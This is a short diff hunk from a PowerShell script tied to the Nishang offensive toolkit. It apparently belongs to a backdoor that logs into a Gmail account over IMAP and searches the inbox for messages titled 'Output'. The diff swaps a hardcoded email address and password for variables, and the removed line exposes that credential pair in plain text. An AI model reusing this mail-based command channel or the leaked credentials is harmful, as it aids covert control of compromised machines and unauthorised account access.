@@ -218,7 +218,7 @@ https://github.com/samratashok/nishang
                     }
                 }
                 ReadResponse ""
-                ReadResponse ("$ LOGIN " + "psgcatlite@gmail.com" + " " + "powershellchabi" + "  `r`n") | Out-Null
+                ReadResponse ("$ LOGIN " + "$Username@gmail.com" + " " + "$Password" + "  `r`n") | Out-Null
                 ReadResponse("$ SELECT INBOX`r`n") | Out-Null
                 ReadResponse("$ SEARCH SUBJECT `"Output`"`r`n")
                 ReadResponse("$ LOGOUT`r`n")  | Out-Null
